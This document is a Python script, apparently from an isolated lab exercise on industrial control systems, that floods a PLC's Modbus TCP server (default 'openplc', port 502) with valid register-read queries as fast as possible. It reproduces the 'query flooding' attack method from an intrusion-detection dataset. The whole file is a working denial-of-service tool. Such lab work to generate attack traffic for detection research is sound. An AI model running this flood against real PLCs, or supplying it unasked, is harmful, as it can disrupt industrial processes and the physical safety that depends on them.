#!/usr/bin/env python3
"""
Modbus query flooding / DoS  (Task 3, Step 3c) -- "service overload".

Overwhelms the PLC's Modbus TCP server with a high rate of VALID Modbus queries
(application-layer flood), matching CIC Modbus 2023's "query flooding" method.

For ISOLATED lab use only (see SECURITY.md).

Usage (inside Kali):  python3 modbus_flood.py [host] [port] [duration_seconds]
    default host=openplc  port=502  duration=20
"""
import sys, time
from pymodbus.client import ModbusTcpClient

HOST = sys.argv[1] if len(sys.argv) > 1 else "openplc"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 502
DUR  = float(sys.argv[3]) if len(sys.argv) > 3 else 20.0

c = ModbusTcpClient(HOST, port=PORT)
if not c.connect():
    print(f"[!] could not connect to {HOST}:{PORT}")
    sys.exit(1)

print(f"[*] Flooding {HOST}:{PORT} with Modbus queries for {DUR:.0f}s ...")
n = 0
t0 = time.time()
while time.time() - t0 < DUR:
    c.read_holding_registers(0, count=10)   # a valid query, sent as fast as possible
    n += 1
c.close()

dt = time.time() - t0
print(f"[*] Sent {n} queries in {dt:.1f}s  =  {n/dt:.0f} queries/sec")
print("[*] Done -- query flood complete.")
